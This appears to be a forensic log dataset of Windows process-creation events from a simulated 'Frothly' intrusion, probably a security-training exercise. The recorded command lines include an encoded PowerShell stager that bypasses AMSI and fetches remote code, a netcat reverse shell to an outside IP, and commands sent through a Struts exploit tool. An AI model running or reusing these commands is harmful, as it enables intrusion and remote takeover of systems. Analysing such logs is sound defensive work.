+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:28:40.000+0100","BSTOLL-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\BudStoll
+	Account Name:		BudStoll
+	Account Domain:		AzureAD
+	Logon ID:		0x4B339
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1fac
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x2078
+	Creator Process Name:	C:\Windows\System32\browser_broker.exe
+	Process Command Line:	""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAGwAeQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAVABWAGEATABVAGUAKAAkAE4AVQBsAGwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAE8AbABMAGUAQwBUAGkAbwBuAHMALgBHAGUATgBlAFIAaQBjAC4ARABpAEMAdABpAE8AbgBBAFIAWQBbAFMAdABSAEkATgBnACwAUwB5AFMAVABFAE0ALgBPAEIASgBFAGMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AEEATAB9AEUAbABzAGUAewBbAFMAYwByAEkAcAB0AEIAbABPAEMASwBdAC4AIgBHAGUAdABGAGkAZQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBFACgAJABOAFUAbABMACwAKABOAGUAdwAtAE8AQgBqAGUAYwBUACAAQwBPAEwATABFAGMAVABJAE8AbgBzAC4ARwBFAG4AZQBSAEkAYwAuAEgAYQBTAEgAUwBlAHQAWwBTAFQAcgBpAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIARQBmAF0ALgBBAHMAcwBFAG0AQgBMAHkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcAZQBUAEYASQBlAGwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAFUATABsACwAJAB0AFIAdQBlACkAOwB9ADsAWwBTAHkAUwBUAEUAbQAuAE4ARQBUAC4AUwBFAHIAVgBJAEMARQBQAG8ASQBuAFQATQBBAE4AYQBnAGUAUgBdADoAOgBFAHgAUABFAGMAVAAxADAAMABDAG8ATgB0AGkAbgB1AEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AYgBqAEUAQwB0ACAAUwB5AFMAdABFAE0ALgBOAGUAVAAuAFcARQBCAEMATABJAGUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAQwAuAEgARQBhAEQARQByAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAEQAZQBSAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAUgBvAHgAWQA9AFsAUwB5AHMAdABFAE0ALgBOAGUAdAAuAFcAZQBiAFIARQBxAFUAZQBTAHQAXQA6ADoARABFAGYAYQBVAGwAdABXAGUAQgBQAHIATwBYAHkAOwAkAFcAYwAuAFAAcgBPAFgAWQAuAEMAUgBFAEQAZQBuAFQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBFAFQALgBDAHIARQBEAEUAbgB0AGkAYQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQBUAFcATwBSAGsAQwByAEUARABFAE4AVABpAEEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBuAEMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeABUAC4ARQBuAEMATwBkAEkAbgBnAF0AOgA6AFUAbgBpAEMAbwBkAGUALgBHAEUAdABTAHQAUgBJAG4ARwAoAFsAQwBPAG4AVgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBTAGUANgA0AFMAVABSAEkAbgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBEAGUAUgBTAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBiAEsAUQB4AHAAdQBPAGQANQBMAFAAQwBqAHkAZgBSAEMAMQBCAHgAUABxAFEAOABGAFcASQA9ACIAKQA7ACQAZABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBMAG8AYQBkAEQAQQB0AEEAKAAkAHMAZQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABhAHQAQQBbADAALgAuADMAXQA7ACQAZABBAHQAQQA9ACQARABhAHQAQQBbADQALgAuACQARABhAFQAQQAuAEwARQBuAEcAdABoAF0AOwAtAEoAbwBpAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:13:56.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xf2c
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:12:51.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x15ec
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""mknod /tmp/backpipe p""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:11:45.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x43c
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""md5sum /tmp/colonel.c""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:11:27.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1d94
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""cat /tmp/colonel.c""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:10:55.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1c10
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""base64 --decode /tmp/colonel > /tmp/colonel.c""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:10:13.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1b74
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""ls -lf /tmp""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:09:48.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x28ec
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""echo 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